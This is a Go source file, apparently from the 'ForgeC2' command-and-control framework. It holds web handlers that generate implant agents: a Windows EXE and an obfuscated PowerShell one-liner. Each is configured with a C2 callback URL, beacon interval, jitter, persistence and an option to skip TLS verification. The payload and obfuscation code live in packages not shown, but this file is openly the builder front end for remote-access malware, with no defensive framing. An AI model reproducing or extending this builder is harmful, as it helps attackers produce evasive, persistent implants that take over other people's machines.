package server

import (
	"bytes"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"path/filepath"

	"github.com/forgec2/forgec2/internal/obfuscation"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleGeneratePage(c *gin.Context) {
	data := gin.H{
		"Title":             "ForgeC2 - Generate Agent",
		"ActiveNav":         "generate",
		"DefaultC2":         "http://YOUR-IP:8080",
		"DefaultInt":        s.cfg.Agent.DefaultInterval,
		"DefaultJitter":     s.cfg.Agent.DefaultJitter,
		"DefaultUA":         s.cfg.Agent.DefaultUA,
		"DefaultSkipTLS":    true,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "generate_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleGenerateEXE(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if form.Protocol == "" {
		form.Protocol = "http"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
	}

	outPath, err := payload.GenerateWindowsEXE(cfg, "data/agents")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGeneratePS1(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if form.Protocol == "" {
		form.Protocol = "http"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.AgentConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
	}

	ps1Code, err := payload.GeneratePowerShellSource(cfg)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	oneLiner := obfuscation.GenerateCommandLineOneLiner(ps1Code)

	c.JSON(http.StatusOK, gin.H{
		"success":         true,
		"code":            oneLiner,
		"original_length": len(ps1Code),
		"obfuscated_len":  len(oneLiner),
	})
}


